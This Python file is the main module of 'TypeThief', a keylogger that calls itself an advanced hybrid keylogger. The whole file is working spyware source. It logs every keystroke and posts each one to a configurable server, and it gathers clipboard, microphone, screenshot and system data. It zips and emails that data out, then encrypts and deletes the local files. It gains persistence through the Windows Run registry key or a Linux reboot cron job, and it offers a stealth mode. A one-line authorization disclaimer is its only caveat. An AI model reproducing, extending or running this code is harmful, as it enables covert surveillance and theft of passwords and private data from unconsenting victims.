import sys
import os
sys.path.insert(0, os.path.dirname(__file__) or '.')

from sysinfo import computer_information
from clipboard import copy_clipboard
from keystroke import log_keystrokes
from microphone import record_microphone
from screenshot import capture_screenshot
from sendmail import send_email
from encryption import encrypt_files
import zipfile
from pynput.keyboard import Key, Listener
from threading import Lock, Thread
import logging
import subprocess
from typing import List
import time
import platform
import random
import signal
import requests
from datetime import datetime

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "colorama"])
    from colorama import Fore, Style, init
    init(autoreset=True)

# Configuration
CONFIG = {
    "log_interval": 300,
    "max_log_size": 1024 * 1024,
    "stealth_mode": False,
    "persist": True,
    "server_url": "http://127.0.0.1:5000/keystroke"  # Set for local testing
}

IS_LINUX = platform.system() == "Linux"
IS_WINDOWS = platform.system() == "Windows"

def install_package(package: str) -> None:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if not CONFIG["stealth_mode"]:
            print(f"{Fore.GREEN}Installed {package} successfully.{Style.RESET_ALL}")
    except subprocess.CalledProcessError:
        print(f"{Fore.RED}Failed to install {package}. Install manually: 'pip3 install {package}'{Style.RESET_ALL}")
        sys.exit(1)

required_packages = ['pyfiglet', 'pynput', 'colorama', 'requests']
for pkg in required_packages:
    try:
        __import__(pkg)
    except ImportError:
        install_package(pkg)

from pyfiglet import Figlet

def send_keystroke_to_server(key_str: str) -> None:
    """Send keystroke to the remote server."""
    try:
        payload = {"keystroke": key_str, "timestamp": datetime.now().isoformat()}
        logging.info(f"Sending keystroke to {CONFIG['server_url']}: {payload}")
        response = requests.post(CONFIG["server_url"], json=payload, timeout=5)
        response.raise_for_status()
        logging.info(f"Server responded: {response.text}")
    except requests.RequestException as e:
        logging.error(f"Failed to send keystroke to server: {e}")

def setup_persistence() -> None:
    script_path = os.path.abspath(__file__)
    if IS_WINDOWS:
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, run_key, 0, winreg.KEY_SET_VALUE) as reg:
                winreg.SetValueEx(reg, "TypeThief", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
            logging.info("Persistence set via Windows Registry.")
            if not CONFIG["stealth_mode"]:
                print(Fore.CYAN + "Persistence set up for Windows.")
        except Exception as e:
            logging.error(f"Windows persistence failed: {e}")
    elif IS_LINUX:
        try:
            cron_line = f"@reboot {sys.executable} {script_path}\n"
            with open(os.path.expanduser("~/.typecron"), "w") as f:
                f.write(cron_line)
            subprocess.run(["crontab", os.path.expanduser("~/.typecron")], check=True)
            os.remove(os.path.expanduser("~/.typecron"))
            logging.info("Persistence set via Linux crontab.")
            if not CONFIG["stealth_mode"]:
                print(Fore.CYAN + "Persistence set up for Linux.")
        except Exception as e:
            logging.error(f"Linux persistence failed: {e}")

def display_banner() -> None:
    if not CONFIG["stealth_mode"]:
        man = [
            r"         ,;;;,     ",
            r"        ;;;;;;;    ",
            r"     .- `\, '/_    ",
            r"  .'   \  (`(_)   ",
            r" / `-,. \ \_/      ",
            r" \  \/ \ `--`     ",
            r"  \  \  \         ",
            r"   / /| |         ",
            r"  /_/ |_|         ",
            r" ( _\ ( _\        "
        ]
        figlet = Figlet(font='bigchief')
        type_thief = figlet.renderText('TypeThief').split('\n')
        left_width = 11
        max_lines = max(len(man), len(type_thief))
        for i in range(max_lines):
            left = man[i] if i < len(man) else " " * len(man[0])
            right = type_thief[i] if i < len(type_thief) else ""
            print(f"{Fore.RED}{left.ljust(left_width)}{Fore.WHITE}{right}")
        description = (
            "[+] Author: C4l3bpy\n"
            "Description: Advanced hybrid keylogger with real-time server monitoring.\n"
            "Features: Keystrokes, clipboard, audio, screenshots, email exfil, encryption, persistence.\n"
            "Platforms: Windows & Linux | Use responsibly with authorization only.[+] "
        )
        print(f"{Fore.GREEN}{description}{Style.RESET_ALL}")
    else:
        logging.info("Stealth mode active - no banner displayed.")

def create_file_path(base_path="TypeThief") -> str:
    if IS_WINDOWS:
        base_path = os.path.join(os.getenv("APPDATA"), base_path)
    else:
        base_path = os.path.join(os.path.expanduser("~"), f".{base_path.lower()}")
    os.makedirs(base_path, exist_ok=True)
    if not CONFIG["stealth_mode"]:
        print(Fore.CYAN + f"File path created: {base_path}")
    return base_path

def zip_files(file_path: str) -> str:
    files_to_zip = [
        os.path.join(file_path, "f_keystroke.txt"),
        os.path.join(file_path, "f_website.log"),
        os.path.join(file_path, "f_sysinfo.txt"),
        os.path.join(file_path, "f_clipboard.txt"),
    ] + [os.path.join(file_path, f) for f in os.listdir(file_path) if f.startswith("f_microphone_") or f.startswith("f_screenshot_")]
    zip_filename = os.path.join(file_path, f"f_logs_{int(time.time())}.zip")
    try:
        with zipfile.ZipFile(zip_filename, "w", compression=zipfile.ZIP_DEFLATED) as zipf:
            for file in files_to_zip:
                if os.path.exists(file):
                    zipf.write(file, os.path.basename(file))
                    logging.info(f"Added to zip: {file}")
        return zip_filename
    except Exception as e:
        logging.error(f"Error zipping files: {e}")
        return None

def cleanup(file_path: str) -> None:
    files_to_delete = [
        os.path.join(file_path, "f_keystroke.txt"),
        os.path.join(file_path, "f_website.log"),
        os.path.join(file_path, "f_sysinfo.txt"),
        os.path.join(file_path, "f_clipboard.txt"),
    ] + [os.path.join(file_path, f) for f in os.listdir(file_path) if f.startswith("f_microphone_") or f.startswith("f_screenshot_")]
    for file in files_to_delete:
        if os.path.exists(file):
            try:
                os.remove(file)
                logging.info(f"Deleted: {file}")
            except Exception as e:
                logging.error(f"Error deleting {file}: {e}")

def run_background_task(func, file_path: str) -> None:
    time.sleep(random.uniform(1, 5))
    try:
        func(file_path)
    except Exception as e:
        logging.error(f"Background task {func.__name__} failed: {e}")

def exfiltrate_periodically(file_path: str) -> None:
    while True:
        time.sleep(CONFIG["log_interval"])
        try:
            zip_path = zip_files(file_path)
            if zip_path and send_email(zip_path):
                os.remove(zip_path)
                encrypt_files(file_path)
                cleanup(file_path)
                logging.info("Periodic exfiltration completed.")
                if not CONFIG["stealth_mode"]:
                    print(Fore.GREEN + "Periodic exfiltration completed.")
        except Exception as e:
            logging.error(f"Periodic exfiltration failed: {e}")

def signal_handler(sig, frame) -> None:
    logging.info("Interrupt received. Cleaning up.")
    cleanup(file_path)
    sys.exit(0)

def main() -> None:
    global file_path
    file_path = create_file_path()
    logging.basicConfig(
        filename=os.path.join(file_path, "keylogger.log"),
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    message_lock = Lock()

    if IS_LINUX:
        signal.signal(signal.SIGINT, signal_handler)

    if CONFIG["persist"]:
        setup_persistence()

    display_banner()

    def on_press(key):
        with message_lock:
            key_str = str(key).replace("'", "")
            if key_str.startswith("Key."):
                key_str = f"[{key_str[4:].upper()}]"
            else:
                key_str = key_str
            log_keystrokes(file_path, key)
            send_keystroke_to_server(key_str)
        if not CONFIG["stealth_mode"]:
            print(f"{Fore.YELLOW}[Key Pressed]: {key_str}", end="", flush=True)
            print()

    def on_release(key):
        if key == Key.esc:
            with message_lock:
                logging.info("Keystrokes logging completed.")
                if not CONFIG["stealth_mode"]:
                    print(Fore.LIGHTGREEN_EX + "ESC pressed hence the keylogger will be stopped.")
            return False

    listener = Listener(on_press=on_press, on_release=on_release)
    listener.start()

    task_objects = {
        "clipboard": copy_clipboard(file_path),
        "microphone": record_microphone(file_path),
        "screenshot": capture_screenshot(file_path)
    }
    threads = []
    for task in [computer_information]:
        t = Thread(target=run_background_task, args=(task, file_path))
        t.daemon = True
        t.start()
        threads.append(t)

    exfil_thread = Thread(target=exfiltrate_periodically, args=(file_path,))
    exfil_thread.daemon = True
    exfil_thread.start()
    if not CONFIG["stealth_mode"]:
        print(Fore.CYAN + "Periodic exfiltration started.")

    listener.join()

    for name, obj in task_objects.items():
        obj.stop()
        logging.info(f"Stopped {name} monitor.")

    for t in threads:
        t.join()

    try:
        zip_path = zip_files(file_path)
        if zip_path and send_email(zip_path):
            os.remove(zip_path)
            encrypt_files(file_path)
            cleanup(file_path)
            logging.info("Final exfiltration completed.")
            if not CONFIG["stealth_mode"]:
                print(Fore.GREEN + "Final exfiltration completed.")
    except Exception as e:
        logging.error(f"Final exfiltration failed: {e}")

    with message_lock:
        logging.info("All operations completed.")
        if not CONFIG["stealth_mode"]:
            print(Fore.CYAN + "All operations completed. Press Ctrl+C to exit on Linux or any key on Windows.")
            if IS_WINDOWS:
                input()
            elif IS_LINUX:
                while True:
                    time.sleep(1)

if __name__ == "__main__":
    file_path = None
    main()